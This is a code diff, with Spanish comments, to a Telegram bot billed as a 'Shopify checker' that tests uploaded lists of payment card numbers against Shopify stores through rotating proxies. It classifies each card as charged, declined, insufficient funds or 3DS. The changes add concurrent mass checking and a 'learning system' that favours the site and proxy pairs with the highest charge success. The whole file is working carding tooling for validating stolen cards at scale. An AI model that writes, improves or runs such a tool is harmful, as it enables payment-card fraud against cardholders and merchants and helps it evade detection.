@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-Bot de Telegram para verificar tarjetas - VERSIÓN SHIRO STYLE
-Con formato profesional tipo menú, detección de BIN, país, banco, y más.
+Bot de Telegram para verificar tarjetas - VERSIÓN ÉLITE ULTRA (SIN REINTENTOS)
+Con formato profesional, UltraHealth para proxies, sin reintentos en verificaciones.
 """
 
 import os
@@ -22,7 +22,6 @@ from enum import Enum
 import statistics
 import signal
 import sys
-import requests  # Para consultar API de BIN
 
 from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
@@ -65,9 +64,48 @@ logger = logging.getLogger(__name__)
 # ID único para esta instancia
 INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))
 
+# ================== FUNCIÓN PARA BARRA DE PROGRESO ==================
+def create_progress_bar(current: int, total: int, width: int = 20) -> str:
+    """Crea una barra de progreso visual"""
+    if total == 0:
+        return "[" + "░" * width + "]"
+    filled = int((current / total) * width)
+    bar = "█" * filled + "░" * (width - filled)
+    return f"[{bar}]"
+
+# ================== FUNCIÓN PARA FORMATO DE PRECIO ==================
+def format_price(price_str: str) -> str:
+    """Extrae y formatea el precio de la respuesta de manera robusta"""
+    try:
+        # Patrones comunes de precio en respuestas
+        patterns = [
+            r'\$?(\d+\.\d{2})',           # $14.95 o 14.95
+            r'Price["\s:]+(\d+\.\d{2})',   # "Price":"14.95"
+            r'amount["\s:]+(\d+\.\d{2})',  # "amount":14.95
+            r'(\d+\.\d{2})\s*USD',         # 14.95 USD
+            r'USD\s*(\d+\.\d{2})',         # USD 14.95
+            r'total["\s:]+(\d+\.\d{2})',   # "total":14.95
+            r'value["\s:]+(\d+\.\d{2})',   # "value":14.95
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, price_str, re.IGNORECASE)
+            if match:
+                return f"${match.group(1)}"
+        
+        # Si no encuentra patrón, buscar cualquier número con 2 decimales
+        match = re.search(r'(\d+\.\d{2})', price_str)
+        if match:
+            return f"${match.group(1)}"
+            
+    except Exception as e:
+        logger.debug(f"Error formateando precio: {e}")
+    
+    return "N/A"
+
 # ================== FUNCIÓN PARA CONSULTAR BIN ==================
 async def get_bin_info(bin_code: str) -> Dict:
-    """Consulta información de BIN usando API externa"""
+    """Consulta información de BIN usando API externa con aiohttp"""
     try:
         # Usar API gratuita de BIN
         async with aiohttp.ClientSession() as session:
@@ -81,6 +119,8 @@ async def get_bin_info(bin_code: str) -> Dict:
                         "type": data.get("type", "Unknown"),
                         "level": data.get("brand", "Unknown")
                     }
+    except asyncio.TimeoutError:
+        logger.debug(f"Timeout consultando BIN {bin_code}")
     except Exception as e:
         logger.debug(f"Error consultando BIN {bin_code}: {e}")
     
@@ -92,26 +132,6 @@ async def get_bin_info(bin_code: str) -> Dict:
         "level": "Unknown"
     }
 
-# ================== FUNCIÓN PARA EXTRAER PRECIO ==================
-def extract_price(response_text: str) -> str:
-    """Extrae el precio de la respuesta de la API"""
-    try:
-        # Buscar patrones de precio
-        patterns = [
-            r'\$?(\d+\.\d{2})',
-            r'Price["\s:]+(\d+\.\d{2})',
-            r'amount["\s:]+(\d+\.\d{2})',
-            r'(\d+\.\d{2})\s*USD',
-        ]
-        
-        for pattern in patterns:
-            match = re.search(pattern, response_text, re.IGNORECASE)
-            if match:
-                return f"${match.group(1)}"
-    except:
-        pass
-    return "$0.00"
-
 # ================== ENUMS Y DATACLASSES ==================
 class CheckStatus(Enum):
     CHARGED = "charged"
@@ -121,6 +141,7 @@ class CheckStatus(Enum):
     CAPTCHA = "captcha"
     INSUFFICIENT_FUNDS = "insufficient_funds"
     THREE_DS = "3ds"
+    UNKNOWN = "unknown"
 
 @dataclass
 class CheckResult:
@@ -247,6 +268,23 @@ class Database:
                     proxies TEXT DEFAULT '[]',
                     cards TEXT DEFAULT '[]',
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            ''')
+            
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS learning (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    user_id INTEGER,
+                    site TEXT,
+                    proxy TEXT,
+                    attempts INTEGER DEFAULT 0,
+                    successes INTEGER DEFAULT 0,
+                    timeouts INTEGER DEFAULT 0,
+                    declines INTEGER DEFAULT 0,
+                    charged INTEGER DEFAULT 0,
+                    total_time REAL DEFAULT 0,
+                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    UNIQUE(user_id, site, proxy)
                 )
             ''')
             
@@ -413,7 +451,81 @@ class ProxyHealthChecker:
         
         return final_results
 
-# ================== CHECKER ==================
+# ================== SISTEMA DE APRENDIZAJE ==================
+class LearningSystem:
+    def __init__(self, db: Database, user_id: int):
+        self.db = db
+        self.user_id = user_id
+        self.EPSILON = 0.1
+
+    async def update(self, result: CheckResult):
+        site = result.site
+        proxy = result.proxy
+        elapsed = result.response_time
+        
+        existing = await self.db.fetch_one(
+            "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
+            (self.user_id, site, proxy)
+        )
+        
+        if existing:
+            attempts = existing["attempts"] + 1
+            successes = existing["successes"] + (1 if result.success else 0)
+            timeouts = existing["timeouts"] + (1 if result.status == CheckStatus.TIMEOUT else 0)
+            declines = existing["declines"] + (1 if result.status == CheckStatus.DECLINED else 0)
+            charged = existing["charged"] + (1 if result.status == CheckStatus.CHARGED else 0)
+            total_time = existing["total_time"] + elapsed
+            
+            await self.db.execute(
+                """UPDATE learning SET 
+                   attempts = ?, successes = ?, timeouts = ?, declines = ?,
+                   charged = ?, total_time = ?, last_seen = CURRENT_TIMESTAMP
+                   WHERE id = ?""",
+                (attempts, successes, timeouts, declines, charged, total_time, existing["id"])
+            )
+        else:
+            await self.db.execute(
+                """INSERT INTO learning 
+                   (user_id, site, proxy, attempts, successes, timeouts, declines, charged, total_time)
+                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+                (self.user_id, site, proxy, 1, 1 if result.success else 0,
+                 1 if result.status == CheckStatus.TIMEOUT else 0,
+                 1 if result.status == CheckStatus.DECLINED else 0,
+                 1 if result.status == CheckStatus.CHARGED else 0, elapsed)
+            )
+
+    async def get_score(self, site: str, proxy: str) -> float:
+        row = await self.db.fetch_one(
+            "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
+            (self.user_id, site, proxy)
+        )
+        
+        if not row or row["attempts"] < 3:
+            return 0.5
+        
+        attempts = row["attempts"]
+        charged = row["charged"]
+        avg_time = row["total_time"] / attempts if attempts > 0 else 1.0
+        
+        success_rate = charged / attempts
+        speed_score = 1.0 / (avg_time + 0.5)
+        
+        return success_rate * 1.5 + speed_score * 0.5
+
+    async def choose_combination(self, sites: List[str], proxies: List[str]) -> Tuple[str, str]:
+        if random.random() < self.EPSILON:
+            return random.choice(sites), random.choice(proxies)
+        
+        scores = []
+        for site in sites:
+            for proxy in proxies:
+                score = await self.get_score(site, proxy)
+                scores.append((score, site, proxy))
+        
+        scores.sort(reverse=True)
+        return scores[0][1], scores[0][2]
+
+# ================== CHECKER ULTRA RÁPIDO (SIN REINTENTOS) ==================
 class UltraFastChecker:
     def __init__(self):
         self.connector = None
@@ -468,19 +580,20 @@ class UltraFastChecker:
         bin_info = await get_bin_info(card_data['bin'])
         
         try:
+            # SOLO UN INTENTO - SIN REINTENTOS
             async with session.get(API_ENDPOINTS[0], params=params, timeout=10) as resp:
                 elapsed = time.time() - start_time
                 response_text = await resp.text()
                 
                 # Determinar estado
-                status = CheckStatus.ERROR
+                status = CheckStatus.UNKNOWN
                 success = False
                 
                 if resp.status == 200:
                     if "Thank You" in response_text or "CHARGED" in response_text:
                         status = CheckStatus.CHARGED
                         success = True
-                    elif "3DS" in response_text:
+                    elif "3DS" in response_text or "3D_AUTHENTICATION" in response_text:
                         status = CheckStatus.THREE_DS
                     elif "CAPTCHA" in response_text:
                         status = CheckStatus.CAPTCHA
@@ -488,13 +601,13 @@ class UltraFastChecker:
                         status = CheckStatus.INSUFFICIENT_FUNDS
                     elif "DECLINE" in response_text:
                         status = CheckStatus.DECLINED
-                    else:
-                        status = CheckStatus.UNKNOWN
-                else:
+                elif resp.status >= 500:
                     status = CheckStatus.ERROR
+                elif resp.status >= 400:
+                    status = CheckStatus.DECLINED
                 
                 # Extraer precio
-                price = extract_price(response_text)
+                price = format_price(response_text)
                 
                 return CheckResult(
                     card_bin=card_data['bin'],
@@ -510,7 +623,25 @@ class UltraFastChecker:
                     bin_info=bin_info,
                     price=price
                 )
-        except Exception as e:
+                
+        except asyncio.TimeoutError:
+            elapsed = time.time() - start_time
+            return CheckResult(
+                card_bin=card_data['bin'],
+                card_last4=card_data['last4'],
+                site=site,
+                proxy=proxy,
+                status=CheckStatus.TIMEOUT,
+                response_time=elapsed,
+                http_code=None,
+                response_text="",
+                api_used=API_ENDPOINTS[0],
+                success=False,
+                bin_info=bin_info,
+                price="$0.00",
+                error="Timeout"
+            )
+        except aiohttp.ClientError as e:
             elapsed = time.time() - start_time
             return CheckResult(
                 card_bin=card_data['bin'],
@@ -521,11 +652,29 @@ class UltraFastChecker:
                 response_time=elapsed,
                 http_code=None,
                 response_text="",
-                api_used="none",
-                error=str(e),
+                api_used=API_ENDPOINTS[0],
                 success=False,
                 bin_info=bin_info,
-                price="$0.00"
+                price="$0.00",
+                error=str(e)
+            )
+        except Exception as e:
+            elapsed = time.time() - start_time
+            logger.error(f"Error inesperado: {e}", exc_info=True)
+            return CheckResult(
+                card_bin=card_data['bin'],
+                card_last4=card_data['last4'],
+                site=site,
+                proxy=proxy,
+                status=CheckStatus.ERROR,
+                response_time=elapsed,
+                http_code=None,
+                response_text="",
+                api_used=API_ENDPOINTS[0],
+                success=False,
+                bin_info=bin_info,
+                price="$0.00",
+                error=str(e)
             )
         finally:
             await self.return_session(session)
@@ -615,16 +764,87 @@ class UserManager:
             (datetime.now(), user_id)
         )
 
+# ================== CARD CHECK SERVICE ==================
+class CardCheckService:
+    def __init__(self, db: Database, user_manager: UserManager, checker: UltraFastChecker):
+        self.db = db
+        self.user_manager = user_manager
+        self.checker = checker
+
+    async def check_single(self, user_id: int, card_data: Dict, site: str, proxy: str) -> CheckResult:
+        result = await self.checker.check_card(site, proxy, card_data)
+        await self.db.save_result(user_id, result)
+        
+        learning = LearningSystem(self.db, user_id)
+        await learning.update(result)
+        
+        return result
+
+    async def check_mass(
+        self, 
+        user_id: int,
+        cards: List[Dict],
+        sites: List[str],
+        proxies: List[str],
+        num_workers: int,
+        progress_callback=None
+    ) -> Tuple[List[CheckResult], int, float]:
+        
+        queue = asyncio.Queue()
+        for card in cards:
+            await queue.put(card)
+        
+        results = []
+        processed = 0
+        success_count = 0
+        start_time = time.time()
+        learning = LearningSystem(self.db, user_id)
+        
+        async def worker(worker_id: int):
+            nonlocal processed, success_count
+            worker_processed = 0
+            worker_success = 0
+            
+            while not queue.empty() and not cancel_mass.get(user_id, False):
+                try:
+                    card_data = await asyncio.wait_for(queue.get(), timeout=1.0)
+                except asyncio.TimeoutError:
+                    break
+                
+                site, proxy = await learning.choose_combination(sites, proxies)
+                result = await self.checker.check_card(site, proxy, card_data)
+                
+                worker_processed += 1
+                if result.success:
+                    worker_success += 1
+                
+                results.append(result)
+                await learning.update(result)
+                await self.db.save_result(user_id, result)
+                
+                processed += 1
+                if result.success:
+                    success_count += 1
+                
+                if progress_callback and worker_processed % 5 == 0:
+                    await progress_callback(processed, success_count, len(cards))
+        
+        tasks = [asyncio.create_task(worker(i)) for i in range(num_workers)]
+        await asyncio.gather(*tasks, return_exceptions=True)
+        
+        elapsed = time.time() - start_time
+        return results, success_count, elapsed
+
 # ================== VARIABLES GLOBALES ==================
 db = None
 user_manager = None
 checker = None
+card_service = None
 cancel_mass = {}
 
 # ================== HANDLERS ==================
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Comando de inicio - Muestra el menú principal"""
     texto = (
         "❖ *SHOPIFY CHECKER BOT* ❖\n"
         "━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -654,7 +874,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ===== COMANDOS DE SITIOS =====
 async def addsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Añade un sitio Shopify"""
     if not context.args:
         await update.message.reply_text(
             "❖ *USAGE*: `/addsite [url]`\n"
@@ -683,7 +902,6 @@ async def addsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def listsites(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Lista todos los sitios guardados"""
     user_id = update.effective_user.id
     user_data = await user_manager.get_user_data(user_id)
     sites = user_data["sites"]
@@ -704,7 +922,6 @@ async def listsites(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
 
 async def removesite(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Elimina un sitio específico"""
     if not context.args:
         await update.message.reply_text(
             "❖ *USAGE*: `/removesite [number]`\n"
@@ -741,7 +958,6 @@ async def removesite(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ===== COMANDOS DE PROXIES =====
 async def addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Añade un proxy"""
     if not context.args:
         await update.message.reply_text(
             "❖ *USAGE*: `/addproxy [ip:port]` or `/addproxy [ip:port:user:pass]`\n"
@@ -767,7 +983,6 @@ async def addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_data["proxies"].append(proxy)
     await user_manager.update_user_data(user_id, proxies=user_data["proxies"])
     
-    # Mostrar solo host:port en la respuesta
     display_proxy = proxy.split(':')[0] + ':' + proxy.split(':')[1]
     
     await update.message.reply_text(
@@ -779,7 +994,6 @@ async def addproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def listproxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Lista todos los proxies guardados"""
     user_id = update.effective_user.id
     user_data = await user_manager.get_user_data(user_id)
     proxies = user_data["proxies"]
@@ -801,7 +1015,6 @@ async def listproxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
 
 async def removeproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Elimina un proxy específico"""
     if not context.args:
         await update.message.reply_text(
             "❖ *USAGE*: `/removeproxy [number]`\n"
@@ -839,7 +1052,6 @@ async def removeproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def proxyhealth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Verifica el estado de los proxies"""
     user_id = update.effective_user.id
     user_data = await user_manager.get_user_data(user_id)
     proxies = user_data["proxies"]
@@ -867,7 +1079,6 @@ async def proxyhealth_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     alive = [r for r in results if r["alive"]]
     dead = [r for r in results if not r["alive"]]
     
-    # Crear botones
     keyboard = []
     if dead:
         keyboard.append([InlineKeyboardButton("🗑️ REMOVE DEAD PROXIES", callback_data=f"clean_{user_id}")])
@@ -896,7 +1107,6 @@ async def proxyhealth_command(update: Update, context: ContextTypes.DEFAULT_TYPE
     await msg.edit_text("\n".join(lines), parse_mode="Markdown", reply_markup=reply_markup)
 
 async def cleanproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Elimina todos los proxies muertos"""
     user_id = update.effective_user.id
     user_data = await user_manager.get_user_data(user_id)
     proxies = user_data["proxies"]
@@ -918,7 +1128,6 @@ async def cleanproxies_command(update: Update, context: ContextTypes.DEFAULT_TYP
     alive_proxies = [r["proxy"] for r in results if r["alive"]]
     dead_count = len([r for r in results if not r["alive"]])
     
-    # Actualizar lista de proxies (solo mantener vivos)
     await user_manager.update_user_data(user_id, proxies=alive_proxies)
     
     await msg.edit_text(
@@ -931,7 +1140,6 @@ async def cleanproxies_command(update: Update, context: ContextTypes.DEFAULT_TYP
 
 # ===== COMANDOS DE TARJETAS =====
 async def addcards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Añade tarjetas desde un archivo .txt"""
     await update.message.reply_text(
         "❖ *ADD CARDS* ❖\n"
         "━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -943,7 +1151,6 @@ async def addcards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def listcards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Lista todas las tarjetas guardadas"""
     user_id = update.effective_user.id
     user_data = await user_manager.get_user_data(user_id)
     cards = user_data["cards"]
@@ -969,7 +1176,6 @@ async def listcards(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
 
 async def removecard(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Elimina una tarjeta específica"""
     if not context.args:
         await update.message.reply_text(
             "❖ *USAGE*: `/removecard [number]`\n"
@@ -1009,7 +1215,6 @@ async def removecard(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ===== COMANDOS DE VERIFICACIÓN =====
 async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Verifica una tarjeta (Shopify Custom Gate)"""
     if len(context.args) < 1:
         await update.message.reply_text(
             "❖ *SHOPIFY CUSTOM GATE* ❖\n"
@@ -1035,7 +1240,6 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     user_id = update.effective_user.id
     
-    # Rate limit
     allowed, msg = await user_manager.check_rate_limit(user_id)
     if not allowed:
         await update.message.reply_text(f"⏳ {msg}")
@@ -1058,15 +1262,13 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "❌ *NO PROXIES FOUND*\n"
             "━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "Use `/addproxy` to add a proxy first.\n"
-            "Format: `ip:port` or `ip:port:user:pass`",
+            "Use `/addproxy` to add a proxy first.",
             parse_mode="Markdown"
         )
         return
     
-    # Seleccionar sitio y proxy (rotación simple)
-    site = sites[0]  # Por ahora el primero
-    proxy = proxies[0]  # Por ahora el primero
+    learning = LearningSystem(db, user_id)
+    site, proxy = await learning.choose_combination(sites, proxies)
     
     msg = await update.message.reply_text(
         f"❖ *SHOPIFY CUSTOM GATE* ❖\n"
@@ -1077,12 +1279,9 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
     
-    # Verificar
-    result = await checker.check_card(site, proxy, card_data)
-    await db.save_result(user_id, result)
+    result = await card_service.check_single(user_id, card_data, site, proxy)
     await user_manager.increment_checks(user_id)
     
-    # Determinar emoji de estado
     if result.success:
         status_emoji = "✅"
         status_text = "APPROVED"
@@ -1102,7 +1301,6 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         status_emoji = "❓"
         status_text = "ERROR"
     
-    # Formatear respuesta
     response = (
         f"{status_emoji} *SHOPIFY GATE RESULT* {status_emoji}\n"
         f"━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -1118,10 +1316,8 @@ async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.edit_text(response, parse_mode="Markdown")
 
 async def msh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Verificación masiva"""
     user_id = update.effective_user.id
     
-    # Rate limit
     allowed, msg = await user_manager.check_rate_limit(user_id)
     if not allowed:
         await update.message.reply_text(f"⏳ {msg}")
@@ -1159,7 +1355,6 @@ async def msh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # Parsear tarjetas válidas
     valid_cards = []
     for card_str in cards:
         card_data = CardValidator.parse_card(card_str)
@@ -1180,24 +1375,30 @@ async def msh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
     
-    # Aquí iría la lógica de verificación masiva
-    # Por ahora es un placeholder
-    await asyncio.sleep(2)
+    results, success_count, elapsed = await card_service.check_mass(
+        user_id=user_id,
+        cards=valid_cards,
+        sites=sites,
+        proxies=proxies,
+        num_workers=num_workers,
+        progress_callback=None
+    )
     
-    await msg.edit_text(
+    await user_manager.increment_checks(user_id)
+    
+    response = (
         f"✅ *MASS CHECK COMPLETE* ✅\n"
         f"━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"*PROCESSED*: `{len(valid_cards)}` cards\n"
-        f"*TIME*: `2.0s`\n\n"
+        f"*TIME*: `{elapsed:.2f}s`\n\n"
         f"*RESULTS*\n"
-        f"• ✅ APPROVED: `0`\n"
-        f"• ❌ DECLINED: `{len(valid_cards)}`\n\n"
-        f"*COMING SOON*: Full mass check implementation",
-        parse_mode="Markdown"
+        f"• ✅ APPROVED: `{success_count}`\n"
+        f"• ❌ DECLINED: `{len(valid_cards) - success_count}`"
     )
+    
+    await msg.edit_text(response, parse_mode="Markdown")
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Muestra estadísticas"""
     user_id = update.effective_user.id
     
     total = await db.fetch_one(
@@ -1223,7 +1424,6 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Detiene procesos en curso"""
     user_id = update.effective_user.id
     cancel_mass[user_id] = True
     await update.message.reply_text(
@@ -1235,7 +1435,6 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ===== MANEJO DE ARCHIVOS =====
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Procesa archivos .txt con tarjetas"""
     document = update.message.document
     if not document.file_name.endswith('.txt'):
         await update.message.reply_text("❌ Please send a .txt file.")
@@ -1274,7 +1473,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # ===== CALLBACKS =====
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Maneja los botones inline"""
     query = update.callback_query
     await query.answer()
     
@@ -1315,7 +1513,7 @@ async def shutdown(application: Application):
     logger.info("✅ Shutdown complete")
 
 async def post_init(application: Application):
-    global db, user_manager, checker
+    global db, user_manager, checker, card_service
     
     db = Database()
     await db.initialize()
@@ -1323,6 +1521,8 @@ async def post_init(application: Application):
     user_manager = UserManager(db)
     checker = UltraFastChecker()
     await checker.initialize()
+    
+    card_service = CardCheckService(db, user_manager, checker)
     
     logger.info("✅ Bot initialized")
 
@@ -1364,7 +1564,7 @@ def main():
     # Callbacks
     app.add_handler(CallbackQueryHandler(button_callback))
 
-    logger.info("🚀 Bot started")
+    logger.info("🚀 Bot started (sin reintentos)")
     app.run_polling()
 
 if __name__ == "__main__":
